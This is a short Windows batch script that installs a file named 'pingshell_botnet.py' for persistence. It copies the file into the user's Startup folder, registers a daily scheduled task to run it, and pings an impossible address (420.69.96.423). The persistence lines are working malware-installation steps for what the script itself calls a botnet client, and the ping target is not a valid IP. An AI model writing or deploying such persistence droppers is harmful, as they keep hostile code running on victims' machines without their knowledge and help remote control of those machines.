@echo off
copy "%~dp0pingshell_botnet.py" "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
schtasks /create /tn "MyPythonTask" /tr "python.exe \"%~dp0pingshell_botnet.py\"" /sc daily /st 00:00
ping 420.69.96.423
ping 127.0.0.1 -n 5 > nul

